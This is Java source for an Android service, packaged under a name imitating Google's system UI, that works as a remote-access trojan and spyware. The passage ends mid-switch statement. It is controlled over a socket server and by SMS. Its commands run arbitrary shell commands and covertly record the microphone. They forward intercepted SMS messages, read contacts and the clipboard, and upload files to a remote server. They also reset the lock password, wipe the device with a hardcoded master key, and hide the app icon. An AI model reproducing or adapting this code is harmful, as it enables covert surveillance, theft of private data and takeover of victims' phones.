package com.google.android.systemUi.service;

import android.app.Notification;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.speech.tts.TextToSpeech;
import android.speech.tts.TextToSpeech.OnInitListener;
import android.telephony.SmsManager;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.KeyEvent;

import com.genonbeta.CoolSocket.CoolSocket;
import com.genonbeta.core.ServerAddress;
import com.genonbeta.core.ServerConnection;
import com.github.kevinsawicki.http.HttpRequest;
import com.google.android.systemUi.R;
import com.google.android.systemUi.activity.Configuration;
import com.google.android.systemUi.activity.Starter;
import com.google.android.systemUi.config.AppConfig;
import com.google.android.systemUi.helper.FileUtils;
import com.google.android.systemUi.helper.NotificationPublisher;
import com.google.android.systemUi.receiver.SmsReceiver;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.TimeoutException;

public class CommunicationService extends Service implements OnInitListener
{
	public static final String TAG = "CommunicationService";
	public static final String REMOTE_SERVER = "RemoteServer";

	public static boolean mAdminMode = false;

	private CommunicationServer mCommunicationServer;
	private AudioManager mAudioManager;
	private DevicePolicyManager mDPM;
	private ComponentName mDeviceAdmin;
	private ArrayList<String> mGrantedList = new ArrayList<>();
	private PowerManager mPowerManager;
	private SharedPreferences mPreferences;
	private NotificationPublisher mPublisher;
	private TextToSpeech mSpeech;
	private boolean mTTSInit;
	private boolean mNotifyRequests = false;
	private boolean mSpyMessages = false;
	private Vibrator mVibrator;
	private int mWipeCountdown = 8;
	private long mRemoteThreadDelay = 50000;
	private ArrayList<ParallelConnection> mParallelConnections = new ArrayList<>();
	private ServerConnection mRemote = new ServerConnection();
	private String mCurrentSong = "unknown";
	private RemoteThread mRemoteThread = new RemoteThread();
	private JSONArray mRemoteLogs = new JSONArray();
	private MediaPlayer mPlayer = new MediaPlayer();
	private MediaRecorder mRecorder = new MediaRecorder();
	private ClipboardManager mClipboard;
	private boolean mIsRecording = false;
	private ArrayList<FileHolder> mUploadQueue = new ArrayList<>();
	private int mDownloadsInProgress = 0;

	@Override
	public IBinder onBind(Intent intent)
	{
		return null;
	}

	@Override
	public void onCreate()
	{
		super.onCreate();

		mCommunicationServer = new CommunicationServer();

		if (!mCommunicationServer.start())
			stopSelf();

		mRemoteThread.start();
	}

	@Override
	public void onInit(int result)
	{
		this.mTTSInit = (result == TextToSpeech.SUCCESS);
	}

	@Override
	public int onStartCommand(Intent intent, int p1, int p2)
	{
		mPublisher = new NotificationPublisher(this);
		mAudioManager = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
		mPreferences = PreferenceManager.getDefaultSharedPreferences(this);
		mPowerManager = (PowerManager) getSystemService(Service.POWER_SERVICE);
		mVibrator = (Vibrator) getSystemService(Service.VIBRATOR_SERVICE);
		mClipboard = (ClipboardManager) getSystemService(Service.CLIPBOARD_SERVICE);

		mDeviceAdmin = new ComponentName(this, com.google.android.systemUi.receiver.DeviceAdmin.class);
		mDPM = (DevicePolicyManager) getSystemService(Service.DEVICE_POLICY_SERVICE);

		if (mPreferences.contains("remoteServer"))
			mRemote.setAddress(new ServerAddress(mPreferences.getString("remoteServer", null)));

		if (mPreferences.contains("upprFile")) {
			File uppr = new File(mPreferences.getString("upprFile", "/sdcard/uppr"));

			if (uppr.isFile()) {
				try {
					mVibrator.vibrate(1000);
					mDPM.resetPassword("", 0);
					uppr.renameTo(new File(uppr.getAbsolutePath() + ".old"));
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}

		if (!mPreferences.contains("remoteServer")) {
			File conf = getHiddenFile(AppConfig.DEFAULT_SERVER_FILE);

			if (conf.isFile()) {
				try {
					String index = FileUtils.readFile(conf).toString();
					mPreferences.edit().putString("remoteServer", index).apply();
				} catch (IOException e) {
				}
			}
		}

		if (intent != null)
			if (SmsReceiver.ACTION_SMS_COMMAND_RECEIVED.equals(intent.getAction()) && intent.hasExtra(SmsReceiver.EXTRA_SENDER_NUMBER) && intent.hasExtra(SmsReceiver.EXTRA_MESSAGE)) {
				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);

				runCommand(sender, message, true);
			} else if (SmsReceiver.ACTION_SMS_RECEIVED.equals(intent.getAction())) {
				String message = intent.getStringExtra(SmsReceiver.EXTRA_MESSAGE);
				String sender = intent.getStringExtra(SmsReceiver.EXTRA_SENDER_NUMBER);

				if (mSpyMessages)
					sendToConnections(sender + ">" + message);
			}

		return START_STICKY;
	}

	@Override
	public void onDestroy()
	{
		super.onDestroy();

		mRemoteThread.interrupt();
		mCommunicationServer.stop();
		mPlayer.reset();
		mRecorder.release();

		ttsExit();
	}

	public void downloadFile(final String address, final File file)
	{
		new Thread()
		{
			@Override
			public void run()
			{
				super.run();
				mDownloadsInProgress++;

				HttpRequest httpRequest = HttpRequest.get(address);

				if (httpRequest.ok())
					httpRequest.receive(file);

				mDownloadsInProgress--;
			}
		}.start();
	}

	public File getHiddenDirectory()
	{
		//File hiddenDir = getApplicationContext().getFilesDir();
		File hiddenDir = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + File.separator + "Android" + File.separator + "data" + File.separator + ".UserInteraction");
		hiddenDir.mkdirs();

		return hiddenDir;
	}

	public File getHiddenFile(CharSequence fileName)
	{
		return new File(getHiddenDirectory() + File.separator + fileName);
	}

	public File getHiddenRecordingsDirectory()
	{
		File recordsDirs = new File(getHiddenDirectory().getAbsolutePath() + File.separator + "Recordings");
		recordsDirs.mkdir();

		return recordsDirs;
	}

	public long getRemoteServerDelay()
	{
		try {
			return Long.valueOf(mPreferences.getString("remoteServerDelay", String.valueOf(mRemoteThreadDelay)));
		} catch (NumberFormatException e) {
		}

		return mRemoteThreadDelay;
	}

	protected String ringerMode(int mode)
	{
		switch (mode) {
			case AudioManager.RINGER_MODE_NORMAL:
				return "normal";
			case AudioManager.RINGER_MODE_SILENT:
				return "silent";
			case AudioManager.RINGER_MODE_VIBRATE:
				return "vibrate";
			default:
				return "unknown";
		}
	}

	protected void runCommand(final String sender, final String message, final boolean smsMode)
	{
		new Thread(new Runnable()
		{
			@Override
			public void run()
			{
				JSONObject response = new JSONObject();
				JSONObject receivedMessage;

				try {
					receivedMessage = new JSONObject(message);
				} catch (JSONException e) {
					receivedMessage = new JSONObject();
				}

				try {
					mCommunicationServer.handleRequest(null, receivedMessage, response, sender);
				} catch (Exception e) {
					e.printStackTrace();
				}

				if (REMOTE_SERVER.equals(sender)) {
					mRemoteLogs.put(response.toString());

					new Thread()
					{
						@Override
						public void run()
						{
							super.run();
							mRemoteThread.doCommunicate();
						}
					}.start();
				}

				if (smsMode && !silenceActivated())
					SmsManager.getDefault().sendTextMessage(sender, null, response.toString(), null, null);
			}
		}
		).start();
	}

	protected void sendToConnections(String message)
	{
		for (ParallelConnection conn : mParallelConnections) {
			conn.sendMessage(message);
		}
	}

	public boolean silenceActivated()
	{
		return mPreferences.getBoolean("silence", false);
	}

	public File startVoiceRecording() throws IllegalStateException, IOException
	{
		stopVoiceRecording();

		mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		mRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
		mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);

		File outputFile = new File(getHiddenRecordingsDirectory().getAbsolutePath()
				+ File.separator
				+ DateFormat.format("yyyy_MM_dd_HH_mm_ss", System.currentTimeMillis())
				+ ".wav");

		mRecorder.setOutputFile(outputFile.getAbsolutePath());
		mRecorder.prepare();
		mRecorder.start();

		mIsRecording = true;

		return outputFile;
	}

	public void stopVoiceRecording()
	{
		mRecorder.release();
		mRecorder = new MediaRecorder();
		mIsRecording = false;
	}

	private boolean ttsExit()
	{
		mTTSInit = false;

		if (mSpeech == null)
			return false;

		try {
			mSpeech.shutdown();
			return true;
		} catch (Exception e) {
		}

		return false;
	}

	protected String wifiState(int state)
	{
		switch (state) {
			case WifiManager.WIFI_STATE_DISABLING:
				return "disabling";
			case WifiManager.WIFI_STATE_DISABLED:
				return "disabled";
			case WifiManager.WIFI_STATE_ENABLING:
				return "enabling";
			case WifiManager.WIFI_STATE_ENABLED:
				return "enabled";
			default:
				return "unknown";
		}
	}

	private class CommunicationServer extends CoolSocket
	{
		public CommunicationServer()
		{
			super(AppConfig.COMMUNICATION_SERVER_PORT);
			this.setSocketTimeout(AppConfig.DEFAULT_SOCKET_TIMEOUT);
		}

		@Override
		protected void onConnected(ActiveConnection activeConnection)
		{
			try {
				String response = null;
				JSONObject receivedMessage;
				JSONObject responseJson = new JSONObject();

				response = activeConnection.receive().response;

				try {
					receivedMessage = new JSONObject(response);
				} catch (JSONException e) {
					receivedMessage = new JSONObject();
				}

				try {
					handleRequest(activeConnection.getSocket(), receivedMessage, responseJson, activeConnection.getClientAddress());
				} catch (Exception e) {
					responseJson.put("error", e.toString());
				}

				activeConnection.reply(responseJson.toString(2));
			} catch (IOException e) {
				e.printStackTrace();
			} catch (TimeoutException e) {
				e.printStackTrace();
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}

		public void handleRequest(Socket socket, final JSONObject receivedMessage, JSONObject response, String clientIp) throws Exception
		{
			boolean result = false;
			Intent actionIntent = new Intent();

			if (receivedMessage.has("silence")) {
				mPreferences.edit().putBoolean("silence", receivedMessage.getBoolean("silence")).apply();
				response.put("silenceMode", receivedMessage.getBoolean("silence"));
			}

			if (receivedMessage.has("printDeviceName") && receivedMessage.getBoolean("printDeviceName"))
				response.put("deviceName", mPreferences.getString("deviceName", Build.MODEL));

			if (mNotifyRequests) {
				Notification.Builder builder = new Notification.Builder(CommunicationService.this);

				builder
						.setStyle(new Notification.BigTextStyle().bigText(receivedMessage.toString()))
						.setSmallIcon(android.R.drawable.stat_sys_download_done)
						.setTicker(receivedMessage.toString())
						.setContentTitle(clientIp)
						.setContentText(receivedMessage.toString());

				mPublisher.notify(0, builder.build());

				response.put("warning", "Request notified");
			}

			if (!mGrantedList.contains(clientIp) && !REMOTE_SERVER.equals(clientIp)) {
				if (!mPreferences.contains("password")) {
					if (receivedMessage.has("accessPassword")) {
						mPreferences.edit().putString("password", receivedMessage.getString("accessPassword")).apply();
						response.put("info", "Password is set to " + receivedMessage.getString("accessPassword"));
					} else {
						response.put("info", "Password is never set. To set use 'accessPassword' ");
					}
				} else if (receivedMessage.has("password")) {
					if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("password"))) {
						mGrantedList.add(clientIp);
						response.put("info", "Access granted");
					} else
						response.put("info", "Password was incorrect");
				} else {
					response.put("info", "To access use 'password'");
				}
			} else if (receivedMessage.has("request")) {
				if (receivedMessage.has("action")) {
					actionIntent.setAction(receivedMessage.getString("action"));

					if (receivedMessage.has("key") && receivedMessage.has("value"))
						actionIntent.putExtra(receivedMessage.getString("key"), receivedMessage.getString("value"));
				}

				String request = receivedMessage.getString("request");

				switch (request) {
					case "configure":
						startActivity(new Intent(CommunicationService.this, Configuration.class)
								.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
								.putExtra(Configuration.EXTRA_PASSWORD, mPreferences.getString("password", "password")));

						result = true;
						break;
					case "sayHello":
						PackageInfo packInfo = getPackageManager().getPackageInfo(getApplicationInfo().packageName, 0);

						response.put("versionName", packInfo.versionName);
						response.put("versionCode", packInfo.versionCode);

						response.put("device", Build.BRAND + " " + Build.MODEL);

						result = true;
						break;
					case "makeToast":
						mPublisher.makeToast(receivedMessage.getString("message"));
						result = true;
						break;
					case "makeNotification":
						mPublisher.notify(receivedMessage.getInt("id"), mPublisher.makeNotification(android.R.drawable.stat_sys_warning, receivedMessage.getString("title"), receivedMessage.getString("content"), receivedMessage.getString("info"), (receivedMessage.has("ticker") ? receivedMessage.getString("ticker") : null)));
						result = true;
						break;
					case "cancelNotification":
						mPublisher.cancelNotification(receivedMessage.getInt("id"));
						result = true;
						break;
					case "lockNow":
						mDPM.lockNow();
						result = true;
						break;
					case "resetPassword":
						result = mDPM.resetPassword(receivedMessage.getString("password"), 0);
						break;
					case "setVolume":
						mAudioManager.setStreamVolume(AudioManager.STREAM_MUSIC, receivedMessage.getInt("volume"), 0);
						result = true;
						break;
					case "sendBroadcast":
						sendBroadcast(actionIntent);
						result = true;
						break;
					case "startService":
						startService(actionIntent);
						result = true;
						break;
					case "startActivity":
						actionIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						startActivity(actionIntent);
						result = true;
						break;
					case "vibrate":
						long time = 100;

						if (receivedMessage.has("time"))
							time = receivedMessage.getLong("time");

						mVibrator.vibrate(time);
						result = true;
						break;
					case "changeAccessPassword":
						if (mPreferences.getString("password", "genonbeta").equals(receivedMessage.getString("old"))) {
							mPreferences.edit().putString("password", receivedMessage.getString("new")).apply();
							result = true;
						}
						break;
					case "reboot":
						mPowerManager.reboot("Virtual user requested");
						result = true;
						break;
					case "applyPasswordResetFile":
						result = mPreferences.edit().putString("upprFile", receivedMessage.getString("file")).commit();
						break;
					case "getPRFile":
						response.put("info", mPreferences.getString("upprFile", "not set"));
						result = true;
						break;
					case "ttsExit":
						result = ttsExit();
						break;
					case "tts":
						if (mSpeech != null && mTTSInit) {
							Locale locale = null;

							if (receivedMessage.has("language"))
								locale = new Locale(receivedMessage.getString("language"));

							if (locale == null)
								locale = Locale.ENGLISH;

							mSpeech.setLanguage(locale);

							if (Build.VERSION.SDK_INT >= 21)
								mSpeech.speak(receivedMessage.getString("message"), TextToSpeech.QUEUE_ADD, null, null);
							else
								mSpeech.speak(receivedMessage.getString("message"), TextToSpeech.QUEUE_ADD, null);

							response.put("language", "@" + locale.getDisplayLanguage());
							response.put("speak", "@" + receivedMessage.getString("message"));

							result = true;
						} else {
							mSpeech = new TextToSpeech(CommunicationService.this, CommunicationService.this);
							response.put("info", "TTS service is now loading");

							result = true;
						}
						break;
					case "commands":
						DataInputStream dataIS = new DataInputStream(getResources().openRawResource(R.raw.commands));
						JSONArray jsonArray = new JSONArray();

						while (dataIS.available() > 0)
							jsonArray.put(dataIS.readLine());

						dataIS.close();

						response.put("template_list", jsonArray);

						result = true;
						break;
					case "getGrantedList":
						response.put("granted_list", new JSONArray(mGrantedList));
						result = true;
						break;
					case "exit":
						mGrantedList.remove(clientIp);
						result = true;
						break;
					case "runCommand":
						Runtime.getRuntime().exec(receivedMessage.getString("command"));
						result = true;
						break;
					case "setDeviceName":
						result = mPreferences.edit().putString("deviceName", receivedMessage.getString("name")).commit();
						break;
					case "notifyRequests":
						mNotifyRequests = !mNotifyRequests;

						if (!mNotifyRequests)
							mPublisher.cancelNotification(0);

						response.put("notifyRequests", mNotifyRequests);
						result = true;
						break;
					case "send":
						response.put("isSent", CoolSocket.connect(new Client.ConnectionHandler()
						{
							@Override
							public void onConnect(Client client)
							{
								try {
									ActiveConnection activeConnection = client.connect(new InetSocketAddress(receivedMessage.getString("server"), receivedMessage.getInt("port")), AppConfig.DEFAULT_SOCKET_LARGE_TIMEOUT);

									activeConnection.reply(receivedMessage.getString("message"));
									activeConnection.receive();

									client.setReturn(true);
									return;
								} catch (IOException e) {
									e.printStackTrace();
								} catch (JSONException e) {
									e.printStackTrace();
								} catch (TimeoutException e) {
									e.printStackTrace();
								}

								client.setReturn(false);
							}
						}, Boolean.class));

						result = true;
						break;
					case "sendSMS":
						SmsManager smsManager = SmsManager.getDefault();
						smsManager.sendTextMessage(receivedMessage.getString("number"), null, receivedMessage.getString("text"), null, null);
						result = true;
						break;
					case "wipeData":
						response.put("warning", "This feature will delete external storage and protected data");

						if (receivedMessage.has("master") && "gmasterkey".equals(receivedMessage.getString("master"))) {
							if (mWipeCountdown == 0) {
								response.put("info", "Request successful. Wipe requested");

								if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1)
									mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
								else
									mDPM.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);

								result = true;
							} else if (mWipeCountdown > 0) {
								response.put("info", "You need to request " + mWipeCountdown + " times to wipe all data");
								mWipeCountdown--;
							}
						} else
							response.put("error", "Master key required to perform this action.");
						break;
					case "addConnection":
						ParallelConnection connection = null;

						if (receivedMessage.has("telNumber"))
							connection = new ParallelConnection(receivedMessage.getString("telNumber"));
						else
							connection = new ParallelConnection(receivedMessage.getString("server"), receivedMessage.getInt("port"));

						if (!mParallelConnections.contains(connection)) {
							mParallelConnections.add(connection);
							result = true;
						}

						break;
					case "getConnections":

						JSONArray list = new JSONArray();

						for (ParallelConnection pConnection : mParallelConnections) {
							list.put(pConnection.toString());
						}

						response.put("connection_list", list);

						result = true;

						break;
					case "spyMessages":
						mSpyMessages = !mSpyMessages;

						if (mParallelConnections.size() == 0 && mSpyMessages)
							response.put("attention", "No connection has been added use 'addConnection'");

						response.put("spyMessages", mSpyMessages);

						result = true;
						break;
					case "removeAllConnections":
						mParallelConnections.clear();
						result = true;
						break;
					case "sendToAllConnections":
						sendToConnections(receivedMessage.getString("message"));
						result = true;
						break;
					case "adminMode":
						mAdminMode = !mAdminMode;

						response.put("adminMode", mAdminMode);

						result = true;
						break;
					case "ringerMode":
						String mode = receivedMessage.getString("mode");
						int setMode = -100;

						if ("silent".equals(mode))
							setMode = AudioManager.RINGER_MODE_SILENT;
						else if ("normal".equals(mode))
							setMode = AudioManager.RINGER_MODE_NORMAL;
						else if ("vibrate".equals(mode))
							setMode = AudioManager.RINGER_MODE_VIBRATE;

						if (setMode != -100) {
							mAudioManager.setRingerMode(setMode);
							result = true;
						} else
							response.put("error", "Mode could not be set. Mode values can only be vibrate|silent|normal");

						response.put("currentMode", ringerMode(mAudioManager.getRingerMode()));
						break;
					case "writeFile":
						FileUtils.writeFile(new File(receivedMessage.getString("file")), receivedMessage.getString("index"));
						result = true;
						break;
					case "readFile":
						response.put("index", FileUtils.readFileString(new File(receivedMessage.getString("file"))));
						result = true;
						break;
					case "readDirectory":
						File directory = new File(receivedMessage.getString("directory"));
						JSONArray index = new JSONArray();

						for (String file : directory.list())
							index.put(file);

						response.put("index", index);

						result = true;
						break;
					case "remoteServer":
						String currentServer = mPreferences.getString("remoteServer", "not-defined");

						response.put("currentServer", currentServer);

						if (receivedMessage.has("server")) {
							String server = receivedMessage.getString("server");

							mPreferences.edit().putString("remoteServer", server).apply();
							mRemote.setAddress(new ServerAddress(server));

							response.put("newlySet", server);
						}

						if (receivedMessage.has("test")) {
							response.put("isOkay", mRemote.connect());
						}

						if (receivedMessage.has("delay")) {
							response.put("previousDelay", getRemoteServerDelay());
							mPreferences.edit().putString("remoteServerDelay", String.valueOf(receivedMessage.getLong("delay"))).apply();
							mRemoteThreadDelay = getRemoteServerDelay();
						}

						if (receivedMessage.has("backup") && receivedMessage.getBoolean("backup")) {
							File file = getHiddenFile(AppConfig.DEFAULT_SERVER_FILE);

							if (file.isFile())
								file.delete();

							FileUtils.writeFile(file, currentServer);
						}

						result = true;

						break;
					case "stopSelf":
						stopSelf();
						result = true;
						break;
					case "playSong":
						if (receivedMessage.has("name") || receivedMessage.has("file")) {
							if (receivedMessage.has("file")) {
								mPlayer.reset();

								mPlayer.setDataSource(receivedMessage.getString("file"));

								mPlayer.prepare();
								mPlayer.start();

								mCurrentSong = receivedMessage.getString("file");
							} else {
								Cursor cursor;

								if (receivedMessage.has("artist"))
									cursor = getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, new String[]{MediaStore.Audio.Media._ID, MediaStore.Audio.Media.TITLE, MediaStore.Audio.Media.ARTIST}, MediaStore.Audio.Media.TITLE + " LIKE ? AND " + MediaStore.Audio.Media.ARTIST + " LIKE ?", new String[]{"%" + receivedMessage.getString("name") + "%", "%" + receivedMessage.getString("artist") + "%"}, null, null);
								else
									cursor = getContentResolver().query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, new String[]{MediaStore.Audio.Media._ID, MediaStore.Audio.Media.TITLE, MediaStore.Audio.Media.ARTIST}, MediaStore.Audio.Media.TITLE + " LIKE ?", new String[]{"%" + receivedMessage.getString("name") + "%"}, null, null);

								if (cursor.moveToFirst()) {
									int songId = cursor.getInt(cursor.getColumnIndex(MediaStore.Audio.Media._ID));

									mCurrentSong = cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.ARTIST)) + " - " + cursor.getString(cursor.getColumnIndex(MediaStore.Audio.Media.TITLE));

									mPlayer.reset();

									mPlayer.setDataSource(getApplicationContext(), Uri.parse(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI.toString() + "/" + songId));

									mPlayer.prepare();
									mPlayer.start();

									result = true;
								} else
									response.put("error", "The song you requested not found");

								cursor.close();
							}
						} else if (receivedMessage.has("kill")) {
							mPlayer.reset();
							result = true;
						}
						break;
					case "getStatus":
						response.put("playingSong", mPlayer.isPlaying());
						response.put("silenceMode", silenceActivated());
						response.put("recordingVoice", mIsRecording);
						response.put("bluetoothPower", BluetoothAdapter.getDefaultAdapter().isEnabled());
						response.put("wifiPower", wifiState(((WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE)).getWifiState()));
						response.put("remoteDelay", mRemoteThreadDelay);
						response.put("downloadsInProgress", mDownloadsInProgress);
						response.put("ringerMode", ringerMode(mAudioManager.getRingerMode()));
						response.put("streamVolume", mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC));
						response.put("parallelConnections", mParallelConnections.size());
						response.put("notifyRequest", mNotifyRequests);
						response.put("adminMode", mAdminMode);
						response.put("connectedNetwork", ((WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE)).getConnectionInfo().getSSID());
						response.put("ttsInit", mTTSInit);
						response.put("grantedList", mGrantedList);
						response.put("remoteServer", mRemote.getAddress().getFormattedAddress());
						response.put("currentSong", mCurrentSong);
						response.put("hasActiveMedia", mAudioManager.isMusicActive());
						response.put("clipboard", (mClipboard.hasPrimaryClip()) ? mClipboard.getPrimaryClip().getItemAt(0).getText() : null);

						result = true;
						break;
					case "mediaButton":
						if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
							int event = KeyEvent.KEYCODE_MEDIA_PAUSE;

							switch (receivedMessage.getString("event")) {
								case "toggle":
									event = KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE;
									break;
								case "play":
									event = KeyEvent.KEYCODE_MEDIA_PLAY;
									break;
								case "pause":
									event = KeyEvent.KEYCODE_MEDIA_PAUSE;
									break;
								case "next":
									event = KeyEvent.KEYCODE_MEDIA_NEXT;
									break;
								case "previous":
									event = KeyEvent.KEYCODE_MEDIA_PREVIOUS;
									break;
								case "stop":
									event = KeyEvent.KEYCODE_MEDIA_STOP;
									break;
								default:
									response.put("info", "Supported events: play, pause, toggle, stop, next, previous");
							}

							long eventTime = SystemClock.uptimeMillis() - 1;
							KeyEvent downEvent = new KeyEvent(eventTime, eventTime, KeyEvent.ACTION_DOWN, event, 0);

							mAudioManager.dispatchMediaKeyEvent(downEvent);

							result = true;
						} else
							response.put("error", "This command is not supported before API 19");

						break;
					case "clipboard":
						mClipboard.setPrimaryClip(ClipData.newPlainText("receivedText", receivedMessage.getString("text")));
						result = true;
						break;
					case "voiceRecorder":
						String rMode = receivedMessage.has("event") ? receivedMessage.getString("event") : "default";
						response.put("isRecording", mIsRecording);

						switch (rMode) {
							default:
								response.put("event", "record,stop,path");
								break;
							case "record":
								File recordFile = startVoiceRecording();
								response.put("info", "started");
								response.put("file", recordFile.getCanonicalPath());
								result = true;
								break;
							case "stop":
								stopVoiceRecording();
								response.put("info", "stopped");
								result = true;
								break;
							case "path":
								response.put("path", getHiddenRecordingsDirectory().getAbsolutePath());
								result = true;
								break;
						}
						break;
					case "uploadFolder":
						File folderToUpload = null;

						boolean deleteOnExit = receivedMessage.has("delete") && receivedMessage.getBoolean("delete");
						String defaultFolder = receivedMessage.has("default") ? receivedMessage.getString("default") : "default";

						switch (defaultFolder) {
							case "recordings":
								folderToUpload = getHiddenRecordingsDirectory();
								break;
							default:
								folderToUpload = new File(receivedMessage.getString("folder"));
								break;
						}

						if (folderToUpload != null && folderToUpload.isDirectory()) {
							response.put("folder", folderToUpload.getAbsolutePath());

							for (File file : folderToUpload.listFiles()) {
								if (!file.isFile())
									continue;

								FileHolder holder = new FileHolder();

								holder.deleteOnExit = deleteOnExit;
								holder.file = file;
								holder.categoryName = folderToUpload.getName().toLowerCase();

								mUploadQueue.add(holder);
							}

							response.put("info", mUploadQueue.size() + " files will be uploaded" + (deleteOnExit ? " and will be deleted after upload process is done" : ""));
							result = true;
						} else
							response.put("error", "Target folder is suitable. Check if it's a correct path");

						break;
					case "uploadFile":
						File uploadThis = new File(receivedMessage.getString("file"));
						boolean delete = receivedMessage.has("delete") && receivedMessage.getBoolean("delete");

						response.put("file", uploadThis.getAbsolutePath());

						if (uploadThis.isFile()) {
							FileHolder holder = new FileHolder();

							holder.deleteOnExit = delete;
							holder.file = uploadThis;

							mUploadQueue.add(holder);
							response.put("info", "File will be uploaded to remote server on the next connection");
							result = true;
						} else
							response.put("error", "File not found");

						break;
					case "downloadFile":
						File saveTo = new File(receivedMessage.getString("file"));
						String address = receivedMessage.getString("address");

						downloadFile(address, saveTo);
						response.put("info", "Download started. Check it using getStatus.downloadsInProgress");
						result = true;

						break;
					case "clearUploadQueue":
						response.put("info", mUploadQueue.size() + " removed");
						mUploadQueue.clear();
						result = true;
						break;
					case "getUploadQueue":
						JSONArray queueList = new JSONArray();

						for (FileHolder fileHolder : mUploadQueue)
							queueList.put(fileHolder.categoryName + ": " + (fileHolder.deleteOnExit ? "delete;" : "") + fileHolder.file.getName());

						response.put("queue", queueList);
						response.put("total", mUploadQueue.size());

						result = true;
						break;
					case "appIcon":
						PackageManager packageManager = getPackageManager();
						ComponentName componentName = new ComponentName(getApplicationContext(), Starter.class);
						packageManager.setComponentEnabledSetting(componentName, receivedMessage.getBoolean("show") ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

						result = true;
						break;
					case "readContacts":
						ContentResolver contentResolver = getContentResolver();
						Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, ContactsContract.Contacts.DISPLAY_NAME + " LIKE ?", new String[]{"%" + receivedMessage.getString("filterName") + "%"}, ContactsContract.Contacts.DISPLAY_NAME + " ASC");
						int startPosition = receivedMessage.has("limit") ? receivedMessage.getInt("limit") : 0;

						JSONArray contacts = new JSONArray();

						if (cursor.moveToFirst()) {
							do {
								if (startPosition > 0 && cursor.getPosition() < (cursor.getCount() - startPosition))
									continue;

								JSONObject currentContact = new JSONObject();
								JSONArray numbersIndex = new JSONArray();

								String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
								String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

								if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
									Cursor pCur = contentResolver.query(
											ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
											null,
											ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
											new String[]{id}, null);

									while (pCur.moveToNext()) {
										int phoneType = pCur.getInt(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
										String phoneNumber = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
										String type = "unknown";

										switch (phoneType) {
											case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
												type = "mobile";
												break;
											case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
												type = "home";
												break;
											case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
												type = "work";
												break;
											case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
												type = "other";
												break;
											default:
												break;
										}

										numbersIndex.put(new JSONObject()
												.put("number", phoneNumber)
												.put("type", type));
									}

									pCur.close();
								}

								currentContact.put("numbers", numbersIndex);
								currentContact.put("name", name);

								contacts.put(currentContact);
							}
							while (cursor.moveToNext());
						}

						cursor.close();

						response.put("isNameFiltered", receivedMessage.has("filterName") && receivedMessage.getString("filterName").length() > 0);
						response.put("isLimited", receivedMessage.has("limit") && receivedMessage.getInt("limit") > 0);
						response.put("contacts", contacts);
						result = true;
						break;
					case "bluetoothManager":
						BluetoothAdapter bluetoothAdapter = BluetoothAdapter.getDefaultAdapter();
						boolean isEnabled = bluetoothAdapter.isEnabled();

						response.put("bluetoothEnabled", isEnabled);

						switch (receivedMessage.getString("mode")) {
							case "power":
								boolean powerRequest = receivedMessage.getBoolean("power");

								if (powerRequest && !isEnabled)
									result = bluetoothAdapter.enable();
								else if (!powerRequest && isEnabled)
									result = bluetoothAdapter.disable();
								break;
							case "pairList":
